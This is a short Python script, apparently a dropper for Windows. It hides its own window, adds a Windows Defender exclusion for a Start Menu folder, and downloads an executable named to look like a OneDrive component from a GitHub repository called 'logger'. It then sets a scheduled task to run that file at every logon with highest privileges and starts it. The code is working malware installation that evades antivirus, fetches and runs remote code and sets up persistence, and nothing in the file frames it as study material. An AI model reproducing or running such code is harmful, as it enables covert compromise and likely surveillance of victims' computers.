import os
from win32gui import ShowWindow, GetForegroundWindow
from requests import get
from subprocess import run, Popen

workerName = 'OneDriveWorker.exe'
url = f'https://github.com/Pixel48/logger/raw/exe/{workerName}'

folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', os.path.basename(workerName))
filepath = os.path.join(folderpath, workerName)

def create_folder(path):
    if not os.path.exists(path):
        os.makedirs(path)

def download(url, path):
    create_folder(os.path.dirname(path))
    with open(path, 'wb') as file:
        response = get(url)
        if(response.status_code == 200): file.write(response.content)
        else: Popen('cmd /c echo Serwer nie odpowiada & pause 5', shell=True)

def hide_window():
    window = GetForegroundWindow()
    ShowWindow(window, 0)

def setup_task():
    run(['schtasks', '/create', '/tn', 'Log', '/tr', f'"{filepath}"', '/sc', 'onlogon', '/rl', 'highest'])

def defender_ignore(folderpath):
    create_folder(folderpath)
    command = f"Add-MpPreference -ExclusionPath '{folderpath}'"
    run(['powershell', '-command', command ], check=True)

def main():
    hide_window()
    defender_ignore(folderpath)
    download(url, filepath)
    setup_task()
    Popen([filepath])

if __name__ == '__main__':
    main()
